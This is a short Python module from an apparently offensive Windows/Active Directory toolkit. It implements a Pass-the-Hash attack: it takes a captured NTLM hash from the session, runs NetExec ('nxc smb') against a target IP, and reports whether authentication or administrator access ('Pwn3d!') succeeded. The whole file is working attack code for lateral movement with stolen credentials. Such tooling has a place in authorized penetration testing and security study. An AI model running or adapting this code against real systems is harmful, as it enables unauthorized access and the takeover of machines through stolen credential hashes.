# modules/attack/pth.py

from core.colors import blue, green, red, yellow
from core.helpers import run_command


def attack_pth(session, *args):
    if not session.hash:
        print(red("[-] No NTLM hash in current session. PtH requires a hash."))
        return

    target = args[0] if args else input("[?] Target IP: ").strip()
    if not target:
        print(red("[-] No target specified."))
        return

    print(blue(f"[*] Testing Pass-the-Hash to {target} as {session.username}@{session.domain}..."))
    try:
        cmd = (
            f"nxc smb {target} -u {session.username} "
            f"-H {session.hash} -d {session.domain}"
        )
        out, err = run_command(cmd)
        combined = out + err

        if "Pwn3d!" in combined:
            print(green(f"[+] PtH success! Admin access confirmed on {target}"))
        elif "[+]" in combined or "STATUS_SUCCESS" in combined:
            print(green(f"[+] PtH authentication succeeded (non-admin) on {target}"))
        else:
            print(combined if combined.strip() else yellow("[*] No response from target."))
    except Exception as e:
        print(red(f"[!] PtH failed: {e}"))
